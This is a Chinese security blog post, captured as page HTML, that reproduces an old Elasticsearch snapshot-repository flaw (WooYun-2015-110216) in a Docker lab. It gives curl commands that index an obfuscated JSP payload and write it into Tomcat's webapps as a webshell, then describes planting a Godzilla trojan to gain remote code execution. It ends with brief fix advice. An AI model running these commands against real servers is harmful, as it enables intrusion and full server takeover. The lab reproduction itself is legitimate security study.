@@ -1,0 +1,92 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Elasticsearch写入webshell漏洞（WooYun-2015-110216） | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-11T12:21:36.409Z" id="date"> 2023-09-11</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-11T13:48:56.109Z" id="updated"> 2023-09-11</time></div></span><br><span>文章总字数: <div class="control">949</div></span><br><span>预计阅读时间: <div class="control">3 分钟</div></span></div></div><hr><div id="post-content"><h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01-漏洞描述"></a>0x01 漏洞描述</h2>
+<p>ElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。</p>
+<p>所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。</p>
+<p>和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项<code>path.repo</code>中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。</p>
+<h2 id="0x02-漏洞搭建"><a href="#0x02-漏洞搭建" class="headerlink" title="0x02-漏洞搭建"></a>0x02 漏洞搭建</h2>
+<p>编译与启动测试环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">docker-compose build<br>docker-compose up -d<br></code></pre></td></tr></table></figure>
+<p>简单介绍一下本测试环境。本测试环境同时运行了 Tomcat 和 ElasticSearch，Tomcat 目录在<code> /usr/local/tomcat</code>，web 目录是 <code>/usr/local/tomcat/webapps</code>；ElasticSearch 目录在<code> /usr/share/elasticsearch</code>。</p>
+<p>我们的目标就是利用 ElasticSearch，在 /usr/local/tomcat/webapps 目录下写入我们的 webshell。</p>
+<h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03-漏洞复现"></a>0x03 漏洞复现</h2>
+<p>访问存在的漏洞页面：（<strong>9200</strong>一般为<strong>ElasticSearch</strong>的常用端口），此漏洞环境需要与<strong>tomcat</strong>结合使用，发现<strong>8080</strong>端口存在<strong>tomcat</strong>默认配置页面。</p>
+<p class='item-img' data-src='image-20230911203700629.png'><img src="image-20230911203700629.png" alt="image-20230911203700629"></p>
+<p>发现<strong>9200</strong>端口存在<strong>elasticsearch</strong>页面：版本为1.5.1,确认存在漏洞</p>
+<p class='item-img' data-src='image-20230911203915579.png'><img src="image-20230911203915579.png" alt="image-20230911203915579"></p>
+<p>测试流程</p>
+<p>首先创建一个恶意索引文档：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">curl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d&#x27; &#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;&#x27;<br></code></pre></td></tr></table></figure>
+<p><strong>这里要用kali发送</strong></p>
+<p class='item-img' data-src='image-20230911204923665.png'><img src="image-20230911204923665.png" alt="image-20230911204923665"></p>
+<p>再创建一个恶意的存储库，其中 location 的值即为我要写入的路径。</p>
+<p>​		园长：这个 Repositories 的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。</p>
+<p>​		这里我把这个路径指向到了 tomcat 的 web 部署目录，因为只要在这个文件夹创建目录 Tomcat 就会自动创建一个新的应用 (文件名为 wwwroot 的话创建出来的应用名称就是 wwwroot 了)。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http">curl -XPUT &#x27;http://ip:9200/_snapshot/yz.jsp&#x27; -d &#x27;&#123;<br>     &quot;type&quot;: &quot;fs&quot;,<br>     &quot;settings&quot;: &#123;<br>          &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot/&quot;,<br>          &quot;compress&quot;: false<br>     &#125;<br>&#125;&#x27;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230911204944234.png'><img src="image-20230911204944234.png" alt="image-20230911204944234"></p>
+<p>存储库验证并创建:</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http">curl -XPUT &quot;http://ip:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &#x27;&#123;<br>     &quot;indices&quot;: &quot;yz.jsp&quot;,<br>     &quot;ignore_unavailable&quot;: &quot;true&quot;,<br>     &quot;include_global_state&quot;: false<br>&#125;&#x27;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230911205018756.png'><img src="image-20230911205018756.png" alt="image-20230911205018756"></p>
+<p>完成！</p>
+<p><strong>前三步主要是创建一个snapshot-yz.jsp脚本向wwwroot下的test.jsp文件中写入任意字符串）</strong></p>
+<p>访问<code> http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp</code>，这就是我们写入的 webshell。</p>
+<p class='item-img' data-src='image-20230911205218875.png'><img src="image-20230911205218875.png" alt="image-20230911205218875"></p>
+<p>该 shell 的作用是向 wwwroot 下的 test.jsp 文件中写入任意字符串，如：<code>http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success</code>。</p>
+<p class='item-img' data-src='image-20230911205240044.png'><img src="image-20230911205240044.png" alt="image-20230911205240044"></p>
+<p>我们再访问 /wwwroot/test.jsp 就能看到 success 了：</p>
+<p class='item-img' data-src='image-20230911205304011.png'><img src="image-20230911205304011.png" alt="image-20230911205304011"></p>
+<p>现在来写入一句话木马，哥斯拉生成一句话木马：</p>
+<p><strong>生成jsp的shell：</strong></p>
+<p class='item-img' data-src='image-20230911214010387.png'><img src="image-20230911214010387.png" alt="image-20230911214010387"></p>
+<p>如上图进行配置生成木马。</p>
+<p class='item-img' data-src='image-20230911210448171.png'><img src="image-20230911210448171.png" alt="image-20230911210448171"></p>
+<p><strong>URL编码jsp的shell并在f=后输入改编码好的shell:</strong></p>
+<p class='item-img' data-src='image-20230911214056109.png'><img src="image-20230911214056109.png" alt="image-20230911214056109"></p>
+<p class='item-img' data-src='image-20230911214113531.png'><img src="image-20230911214113531.png" alt="image-20230911214113531"></p>
+<p>访问test.jsp发现成功上传shell，直接哥斯拉连接一下</p>
+<p class='item-img' data-src='image-20230911213837138.png'><img src="image-20230911213837138.png" alt="image-20230911213837138"></p>
+<p class='item-img' data-src='image-20230911214243324.png'><img src="image-20230911214243324.png" alt="image-20230911214243324"></p>
+<p>点击测试连接发现成功，直接添加看看</p>
+<p class='item-img' data-src='image-20230911214305046.png'><img src="image-20230911214305046.png" alt="image-20230911214305046"></p>
+<p>发现成功rce</p>
+<h2 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04-修复建议"></a>0x04 修复建议</h2>
+<p>1、升级版本</p>
+<p>2、将<strong>repo</strong>目录权限设置为仅可读，不可写（自己建议的，仅在不影响业务的前提下）</p>
+<h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05-参考文章"></a>0x05 参考文章</h2>
+<p><a target="_blank" rel="noopener" href="https://www.anquanclub.cn/24493.html">-wooyun-2015-110216 Elasticsearch写入webshell</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cute-puli/p/15359890.html">漏洞复现-wooyun-2015-110216-Elasticsearch写入webshell </a></p>
+<p><a target="_blank" rel="noopener" href="https://www.wangan.com/docs/339">Elasticsearch写入webshell漏洞（WooYun-2015-110216）</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/06/%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-warmup/">攻防世界-warmup 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">0x01 漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">0x03 漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">4.</span> <span class="toc-text">0x04 修复建议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
